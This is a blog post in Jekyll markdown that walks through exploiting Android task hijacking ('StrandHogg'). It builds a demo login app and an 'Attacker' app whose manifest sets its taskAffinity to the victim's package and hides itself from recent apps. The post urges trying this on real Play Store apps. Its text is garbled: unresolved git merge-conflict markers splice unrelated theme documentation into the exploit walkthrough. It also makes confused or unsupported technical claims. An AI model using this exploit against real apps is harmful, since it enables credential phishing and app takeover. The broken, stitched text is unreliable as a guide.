---
title: Exploiting Task Hijacking In Android App To Full Application Takeover
author: RashidKhanPathan
date: 2019-08-08 14:10:00 +0800
categories: [Blogging, Tutorial]
tags: [writing]
render_with_liquid: false
---
## Exploiting Task Hijacking In Android App To Full Application Takeover

in this post i will be exploiting `Task Hijacking` also known as `StragHogg` Vulnerability this vulnerability affected almost 90% of Android Devices, after this vunerability the Pocmon Security researchers developed another version of it `StraggHogg 2.0` which is extremely dangerous and google still kept it Classified because it could litrally hijack any Application from Low Level intigrity to High Level which is quite dangerous

so i will explain how we can find vulnerability, how to write exploit for it then lastly how we can patch it but first we will use it on Demo Application which we are going to Develop for our exploitation then we gonna use Real Life Application from Play Store this is going to help you to understand how this vulenrability works in Real-Life also it could be used to get bounty also there are so many vendors they pay for this Vulnerability to so let's get started

## Setup
Prerequsits:
- Android Studio Or Intellij Idea
- Android 9 API 29 Emulator
- Java Programming
- ApkTool
- Window Or Ubuntu, Mac (We are using windows for now)
- Any PlayStore Application To Test or GitHub Downloaded Source Code

first we need Android Studio or Intelij Idea Installed in my case i am using IntelliJ IDEA but feel free to use any IDE you like also we need Android 8.1 Oreo or 9 With API 27 Version Emulator because it not work in Android 10+ Devices but if we see that 8.1 or 9 Version Used by Millions of devices, we are using `Java` Programming here, to Decompile our apk we need tool called `ApkTool` this would help us analyze the source code of our apk 

- Downloading Intellij IDEA
simply goto [IntelliJ-IDEA](https://www.jetbrains.com/idea/download/?section=windows) And Download The Setup and Install it

- Download JAVA JDK and Enviroment Variables Setup
Download the Java JDK from [Java-JDK](https://jdk.java.net/20/) and Install it once you have installed it, it should setup Enviroment Variables Automatically if it doesn't then Open Windows Search type System Properties > Advanced System Properties and set JAVA_HOME with your JDK Path

- Download APKTool

Download APKTool [APKTool](https://apktool.org/docs/install/)

- Download Application To Test From PlayStore
Now We Gonna Download Android Application To Test From Play Store


## Finding Vulnerability

before going to towards finding vulnerablity we need to first understand the what is Tasks and Back Tasks is as well as Launch Modes and Task Affinity is

#### Tasks
A task is a collection of activities that the user interacts with when performing a specific workflow within your app. Tasks are organized in a stack-like structure, and each task represents a separate user session within your app. Tasks help manage the navigation flow and allow users to switch between different parts of your app.

Tasks can consist of one or more activities, and each task has a unique ID. By default, all activities within the same app belong to the same task. However, you can use launch modes and task affinity to customize task behavior for specific activities.

#### Task Example:
`MainActivity.java` - This is the main entry point of your app
```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    
    public void openSecondActivity(View view) {
        Intent intent = new Intent(this, SecondActivity.class);
        startActivity(intent);
    }
}
```
`SecondActivity.java` - A second activity in your app
```java
public class SecondActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);
    }
}
```

#### Back Tasks
A back stack is a part of the task that keeps track of the order in which activities were opened. When a user navigates through your app using the back button or other navigation mechanisms, they move through the activities on the back stack. The most recently opened activity is at the top of the back stack.

Activities are pushed onto the back stack when they are launched and popped off when the user navigates back from them. You can also manage the back stack explicitly to control the navigation flow.

#### Back Stack Example
Suppose you start MainActivity, and then you navigate to SecondActivity by clicking a button. This will create the following task and back stack:

- 1 Task 1 (Initially empty):

    MainActivity

- 2 After opening `SecondActivity`:
    - MainActivity (at the bottom of the stack)
    - SecondActivity (at the top of the stack)

Now, if you press the back button, `SecondActivity` will be removed from the stack, and you'll be back in `MainActivity`. This is the basic behavior of the back stack.

```xml
<!-- AndroidManifest.xml -->
<activity android:name=".MainActivity"></activity>
<activity android:name=".SecondActivity"></activity>
```

we learned tasks and back stacks are essential for managing the navigation and user experience in Android apps. Understanding how activities are organized in tasks and how they are pushed and popped from the back stack is crucial for designing effective app navigation

now let's understand what is Launch Modes and Task Affinity is
#### Launch Modes
Launch modes determine how a new instance of an activity is associated with the existing task stack. Android provides four launch modes:

- Standard (default):
Each time you start an activity, a new instance is created and added to the task stack.
The back button will navigate through the stack in the order activities were launched.

- SingleTop:
If the activity is at the top of the stack, a new instance is not created, and onNewIntent() is called instead.
This is useful when you want to prevent duplicate instances of an activity in the stack.

- SingleTask:
Only one instance of the activity can exist in the entire task stack.
If an instance already exists, Android clears all activities above it in the stack.
Useful for activities that represent the main entry points of your app, like the home screen.

- SingleInstance:
Similar to SingleTask, but the activity instance runs in a separate task.
Useful for tasks that need to be isolated from the rest of the app, such as incoming calls.

To specify the launch mode in your AndroidManifest.xml:
```xml
<activity
    android:name=".YourActivity"
    android:launchMode="singleTop">
    <!-- Other activity attributes -->
</activity>
```

#### Task Affinity
Task affinity defines the relationship between activities and tasks. By default, all activities in an app share the same task and have the same task affinity. However, you can change the task affinity to create separate tasks for certain activities.

To set the task affinity for an activity, you can use the android:taskAffinity attribute in the AndroidManifest.xml.

```xml
<activity
    android:name=".YourActivity"
    android:taskAffinity="com.example.myapp.task">
    <!-- Other activity attributes -->
</activity>
```
In this example, "com.example.myapp.task" is the task affinity for the activity.

#### Code Example
Here's a simple code example to illustrate how launch modes and task affinity can be used together:

```java
// MainActivity.java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void openSecondActivity(View view) {
        Intent intent = new Intent(this, SecondActivity.class);
        startActivity(intent);
    }
}
```
```java
// SecondActivity.java
public class SecondActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);
    }
}
```

```xml
<!-- AndroidManifest.xml -->
<activity
    android:name=".MainActivity"
    android:launchMode="singleTask"
    android:taskAffinity="com.example.myapp.task">
</activity>
<activity android:name=".SecondActivity"></activity>
```
In this example, the MainActivity has a launch mode of "singleTask" and a task affinity of "com.example.myapp.task." This means that only one instance of MainActivity can exist in the task stack, and it has its own task with the specified affinity. Other activities, like SecondActivity, are part of the default task stack. for more information in [Android Tasks](https://developer.android.com/guide/components/activities/tasks-and-back-stack)

i belive that you have understood everything that we needed for finding a Vulnerability

Now we have build an Android Appliction to exploit it, it's not hard at all just follow the steps
first we gonna build a simple app which would have simple functionality i gonna call this app `SecureApplication`

create new app with empty activity and paste this `MainActivity.java` code in that empty activity
```java
package com.example.secureapplication;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {
EditText username, password;
Button clk;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        username = (EditText) findViewById(R.id.username);
        password = (EditText) findViewById(R.id.password);
        clk = (Button) findViewById(R.id.button);
    }

    public void movepage(View v){
        String stname = username.getText().toString();
        String stpass = password.getText().toString();
        if (stname.equals("secure") && stpass.equals("secure@1234")) {
            Intent in = new Intent(MainActivity.this, LoggedIn.class);
            in.putExtra("username", stname);
            in.putExtra("password", stpass);
            startActivity(in);
        }
    }
}
```
and this layout code in `main_activity.xml`
```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/textView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Login Below"
        android:textSize="32dp"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.057" />

    <EditText
        android:id="@+id/username"
        android:layout_width="363dp"
        android:layout_height="48dp"
        android:ems="10"
        android:hint="Enter your Username"
        android:inputType="textPersonName"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.231" />

    <EditText
            android:id="@+id/password"
            android:layout_width="363dp"
            android:layout_height="48dp"
            android:layout_marginBottom="432dp"
            android:ems="10"
            android:hint="Enter your Password"
            android:inputType="textPassword"
            app:layout_constraintBottom_toBottomOf="parent"
            app:layout_constraintEnd_toEndOf="parent"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintTop_toBottomOf="@+id/editTextTextPersonName"
            app:layout_constraintVertical_bias="0.05" tools:ignore="UnknownId"/>

    <Button
        android:id="@+id/button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginBottom="340dp"
        android:text="Login"
        android:onClick="movepage"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintStart_toStartOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>
```
now create java class with name `LoggedIn.java` and paste following code there, i not gonna explain this code because it's easy to understand
```java
package com.example.secureappliction;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.TextView;

public class LoggedIn extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.loggedin_activity);

        TextView userdisp = (TextView) findViewById(R.id.userdisp);
        TextView passdisp = (TextView) findViewById(R.id.passdisp);

        Intent intent = getIntent();
        String username = intent.getStringExtra("username");
        String password = intent.getStringExtra("password");
        userdisp.setText(username);
        passdisp.setText(password);
    }
}
```
and create another layout `loggedin_activity.xml` and paste this following code there
```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".LoggedIn">

    <TextView
        android:id="@+id/userdisp"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="TextView"
        app:layout_constraintBottom_toTopOf="@+id/passdisp"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.87" />

    <TextView
        android:id="@+id/passdisp"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginBottom="500dp"
        android:text="TextView"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintStart_toStartOf="parent" />

    <TextView
        android:id="@+id/textView4"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Your Account Details"
        app:layout_constraintBottom_toTopOf="@+id/userdisp"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />
</androidx.constraintlayout.widget.ConstraintLayout>
```

after all of this just run the application, it would show a simple login screen where user can login using credentials and go on other page where user's credentials showed by page, now this is just simple app this could be any real life application, now let's see it's `AndroidManifest.xml` content
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.secureapplication">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:logo="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SuperSecureApp">
        <activity android:name=".LoggedIn"></activity>
        <activity android:name=".MainActivity" android:launchMode="singleTask">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```
if we read code carefully we can see that it has this following line and here is Vulnerability occur
```xml
<activity android:taskAffinity="singleTask"/>
```
if you see this line of xml code in any decompile android application then you should have to test `Task Hijacking` on it

now we have developed a simple application called `SecureApplication` now we need to build our exploit application which would exploit this Vulnerabiliy, so go back to IDE and create new Application and call it `Attacker`

copy this `MainActivity.java` code and paste in `Attacker` app main activity code, moveTaskToBack(true) containing this activity to the back of the activity stack 
```java
package com.exploit.attackerapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import com.google.android.material.snackbar.Snackbar;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```
after adding java code, add this layout code into `main_activity.xml`
```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Attacker App"
        android:textSize="32dp"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <TextView
        android:id="@+id/msg"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="TextView"
        tools:layout_editor_absoluteX="174dp"
        tools:layout_editor_absoluteY="428dp" />

</androidx.constraintlayout.widget.ConstraintLayout>
```
now let's see our `AndroidManifest.xml`
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.zombie.attackerapp"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AttackerApp"
        android:taskAffinity="com.example.secureapplication">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

<<<<<<< HEAD
now using this `AndroidManifest.xml` we gonna Hijack our `SecureApplication` just by adding PackageName in taskAfffinity, also if you notice there is a `android:excludeFromRecents="true"` this line of code is going to hide `Attacker` application and make it more stealthy and undectable
```xml
<android:taskAffinity="com.example.secureapplication">
=======
After enabling the mathematical feature, you can add math equations with the following syntax: 

- **Block math** should be added with `$$ math $$` with **mandatory** blank lines before and after `$$`
- **Inline math** (in lines) should be added with `$$ math $$` without any blank line before or after `$$`
- **Inline math** (in lists) should be added with `\$$ math $$`

```markdown
<!-- Block math, keep all blank lines -->

$$
LaTeX_math_expression
$$

<!-- Inline math in lines, NO blank lines -->

"Lorem ipsum dolor sit amet, $$ LaTeX_math_expression $$ consectetur adipiscing elit."

<!-- Inline math in lists, escape the first `$` -->

1. \$$ LaTeX_math_expression $$
2. \$$ LaTeX_math_expression $$
3. \$$ LaTeX_math_expression $$
```

## Mermaid

[**Mermaid**](https://github.com/mermaid-js/mermaid) is a great diagram generation tool. To enable it on your post, add the following to the YAML block:

```yaml
---
mermaid: true
---
>>>>>>> 717659d66ef1f68505417fbc8498b88bdbbb1f09
```

now build this application, and see exploit in action in following video

<<<<<<< HEAD
It can be seen that when the Super Secure App is opened normally, it runs in its own task.
When I open the Attacker app, nothing happens on the foreground but the app opens and minimizes itself hiding from recent apps due to the flags defined above.
Now when the Super secure app is opened again, it can be seen that the Attacker's app hijacks the task of Super Secure App.
=======
## Images

### Caption

Add italics to the next line of an image, then it will become the caption and appear at the bottom of the image:

```markdown
![img-description](/path/to/image)
_Image Caption_
```
{: .nolineno}

### Size

In order to prevent the page content layout from shifting when the image is loaded, we should set the width and height for each image.

```markdown
![Desktop View](/assets/img/sample/mockup.png){: width="700" height="400" }
```
{: .nolineno}

> For an SVG, you have to at least specify its _width_, otherwise it won't be rendered.
{: .prompt-info }

Starting from _Chirpy v5.0.0_, `height` and `width` support abbreviations (`height` → `h`, `width` → `w`). The following example has the same effect as the above:

```markdown
![Desktop View](/assets/img/sample/mockup.png){: w="700" h="400" }
```
{: .nolineno}

### Position

By default, the image is centered, but you can specify the position by using one of the classes `normal`, `left`, and `right`.

> Once the position is specified, the image caption should not be added.
{: .prompt-warning }

- **Normal position**

  Image will be left aligned in below sample:

  ```markdown
  ![Desktop View](/assets/img/sample/mockup.png){: .normal }
  ```
  {: .nolineno}

- **Float to the left**

  ```markdown
  ![Desktop View](/assets/img/sample/mockup.png){: .left }
  ```
  {: .nolineno}

- **Float to the right**

  ```markdown
  ![Desktop View](/assets/img/sample/mockup.png){: .right }
  ```
  {: .nolineno}

### Dark/Light mode

You can make images follow theme preferences in dark/light mode. This requires you to prepare two images, one for dark mode and one for light mode, and then assign them a specific class (`dark` or `light`):

```markdown
![Light mode only](/path/to/light-mode.png){: .light }
![Dark mode only](/path/to/dark-mode.png){: .dark }
```

### Shadow

The screenshots of the program window can be considered to show the shadow effect:

```markdown
![Desktop View](/assets/img/sample/mockup.png){: .shadow }
```
{: .nolineno}

### CDN URL

If you host the images on the CDN, you can save the time of repeatedly writing the CDN URL by assigning the variable `img_cdn` of `_config.yml`{: .filepath} file:

```yaml
img_cdn: https://cdn.com
```
{: file='_config.yml' .nolineno}

Once `img_cdn` is assigned, the CDN URL will be added to the path of all images (images of site avatar and posts) starting with `/`.

For instance, when using images:

```markdown
![The flower](/path/to/flower.png)
```
{: .nolineno}

The parsing result will automatically add the CDN prefix `https://cdn.com` before the image path:

```html
<img src="https://cdn.com/path/to/flower.png" alt="The flower">
```
{: .nolineno }

### Image Path

When a post contains many images, it will be a time-consuming task to repeatedly define the path of the images. To solve this, we can define this path in the YAML block of the post:

```yml
---
img_path: /img/path/
---
```

And then, the image source of Markdown can write the file name directly:

```md
![The flower](flower.png)
```
{: .nolineno }

The output will be:

```html
<img src="/img/path/flower.png" alt="The flower">
```
{: .nolineno }

### Preview Image

If you want to add an image at the top of the post, please provide an image with a resolution of `1200 x 630`. Please note that if the image aspect ratio does not meet `1.91 : 1`, the image will be scaled and cropped.

Knowing these prerequisites, you can start setting the image's attribute:

```yaml
---
image:
  path: /path/to/image
  alt: image alternative text
---
```

Note that the [`img_path`](#image-path) can also be passed to the preview image, that is, when it has been set, the  attribute `path` only needs the image file name.

For simple use, you can also just use `image` to define the path.

```yml
---
image: /path/to/image
---
```

### LQIP

For preview images:

```yaml
---
image:
  lqip: /path/to/lqip-file # or base64 URI
---
```

> You can observe LQIP in the preview image of post [_Text and Typography_](/posts/text-and-typography/).


For normal images:

```markdown
![Image description](/path/to/image){: lqip="/path/to/lqip-file" }
```
{: .nolineno }

## Pinned Posts

You can pin one or more posts to the top of the home page, and the fixed posts are sorted in reverse order according to their release date. Enable by:

```yaml
---
pin: true
---
```

## Prompts

There are several types of prompts: `tip`, `info`, `warning`, and `danger`. They can be generated by adding the class `prompt-{type}` to the blockquote. For example, define a prompt of type `info` as follows:

```md
> Example line for prompt.
{: .prompt-info }
```
{: .nolineno }

## Syntax

### Inline Code

```md
`inline code part`
```
{: .nolineno }

### Filepath Hightlight

```md
`/path/to/a/file.extend`{: .filepath}
```
{: .nolineno }

### Code Block

Markdown symbols ```` ``` ```` can easily create a code block as follows:

````md
```
This is a plaintext code snippet.
```
````

#### Specifying Language

Using ```` ```{language} ```` you will get a code block with syntax highlight:

````markdown
```yaml
key: value
```
````

> The Jekyll tag `{% highlight %}` is not compatible with this theme.
{: .prompt-danger }

#### Line Number

By default, all languages except `plaintext`, `console`, and `terminal` will display line numbers. When you want to hide the line number of a code block, add the class `nolineno` to it:

````markdown
```shell
echo 'No more line numbers!'
```
{: .nolineno }
````

#### Specifying the Filename

You may have noticed that the code language will be displayed at the top of the code block. If you want to replace it with the file name, you can add the attribute `file` to achieve this:

````markdown
```shell
# content
```
{: file="path/to/file" }
````

#### Liquid Codes

If you want to display the **Liquid** snippet, surround the liquid code with `{% raw %}` and `{% endraw %}`:

````markdown
{% raw %}
```liquid
{% if product.title contains 'Pack' %}
  This product's title contains the word Pack.
{% endif %}
```
{% endraw %}
````

Or adding `render_with_liquid: false` (Requires Jekyll 4.0 or higher) to the post's YAML block.

## Videos

You can embed a video with the following syntax:

```liquid
{% include embed/{Platform}.html id='{ID}' %}
```
Where `Platform` is the lowercase of the platform name, and `ID` is the video ID.

The following table shows how to get the two parameters we need in a given video URL, and you can also know the currently supported video platforms.

| Video URL                                                                                          | Platform   | ID             |
| -------------------------------------------------------------------------------------------------- | ---------- | :------------- |
| [https://www.**youtube**.com/watch?v=**H-B46URT4mg**](https://www.youtube.com/watch?v=H-B46URT4mg) | `youtube`  | `H-B46URT4mg`  |
| [https://www.**twitch**.tv/videos/**1634779211**](https://www.twitch.tv/videos/1634779211)         | `twitch`   | `1634779211`   |
| [https://www.**bilibili**.com/video/**BV1Q44y1B7Wf**](https://www.bilibili.com/video/BV1Q44y1B7Wf) | `bilibili` | `BV1Q44y1B7Wf` |

## Learn More

For more knowledge about Jekyll posts, visit the [Jekyll Docs: Posts](https://jekyllrb.com/docs/posts/).
>>>>>>> 717659d66ef1f68505417fbc8498b88bdbbb1f09
